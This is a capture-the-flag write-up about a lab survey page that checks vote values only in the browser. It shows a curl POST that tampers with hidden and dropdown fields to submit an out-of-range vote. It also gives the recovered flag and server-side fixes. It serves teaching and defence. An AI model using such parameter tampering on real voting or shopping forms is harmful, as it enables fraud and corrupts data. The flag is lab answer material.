# Survey Vote Manipulation - Hidden Field Tampering

## Breach Type
**Broken Access Control / Input Validation Failure** — OWASP Top 10: A01:2021 Broken Access Control

## What is this Vulnerability?
**Client-Side Input Validation Bypass** is a vulnerability where the application relies on HTML/JavaScript to restrict what values a user can submit, but performs **no validation on the server side**. Since HTML forms are rendered in the user's browser, the user has complete control over every value sent to the server.

In this case, a voting form uses a `<select>` dropdown limiting votes to values 1–10, and a hidden `<input>` for the subject ID. But these are just HTML constraints — an attacker can:
- Use browser DevTools to change the dropdown values
- Use `curl` to send any value directly (e.g., `valeur=1000000`)
- Modify the hidden `sujet` field to vote on any/all subjects

The fundamental problem: **any data coming from the client (browser) is untrusted**. HTML `maxlength`, `<select>` options, `type="hidden"` fields, and JavaScript validation exist only for user experience — they provide **zero security**.

### Why is it dangerous?
- **Vote manipulation**: Skew survey/poll results by injecting extreme values
- **Data integrity compromise**: Invalid values stored in the database can corrupt reports and analytics
- **Business logic bypass**: Hidden fields often control pricing, user IDs, access levels — tampering leads to fraud
- **Cascading failures**: Unexpected values (negative numbers, extremely large numbers, SQL code) can crash backend systems

### Real-world impact
Client-side validation bypass is one of the most common web vulnerabilities. It has been exploited in e-commerce (changing prices), voting systems (ballot stuffing), and gaming (score manipulation).

## Where
URL: `http://<IP>/?page=survey`
The Survey page with voting dropdowns.

## How I Found It
1. Navigated to the **Survey** page (`?page=survey`).
2. The page has voting forms for different subjects with dropdown values from 1 to 10.
3. Inspected the HTML: each form has a **hidden input** `<input type="hidden" name="sujet" value="2">`.
4. The dropdown `<select name="valeur">` also only shows values 1-10.
5. The server only validates the dropdown options client-side — sending a value outside the range works!

## Step-by-Step Exploitation

### Step 1: Inspect the Form
```html
<form action="#" method="post">
    <input type="hidden" name="sujet" value="2">
    <select name="valeur" onChange='javascript:this.form.submit();'>
        <option value="1">1</option>
        ...
        <option value="10">10</option>
    </select>
</form>
```

### Step 2: Send Manipulated Value
Send a value outside the allowed range (e.g., 42) using curl:
```bash
curl -X POST "http://<IP>/?page=survey" -d "sujet=2&valeur=42"
```

### Step 3: Get the Flag
Result:
```
The flag is 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa
```

## Flag
```
03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa
```

## How to Test Manually
1. Open `http://<IP>/?page=survey`
2. Right-click on a dropdown → **Inspect Element**
3. Change one of the `<option value="1">` to `<option value="42">`
4. Select that modified option → The form auto-submits
5. The flag appears

**Or using curl:**
```bash
curl -X POST "http://<IP>/?page=survey" -d "sujet=2&valeur=42"
```

## How to Fix
- **Validate input server-side**: check that `valeur` is between 1 and 10
- **Validate `sujet`** against known values in the database
- Never trust client-side validation alone (HTML attributes, JavaScript, etc.)
- Use server-side **whitelist validation** for all form inputs
- Implement proper **rate limiting** to prevent vote manipulation

## OWASP Reference
- [Input Validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
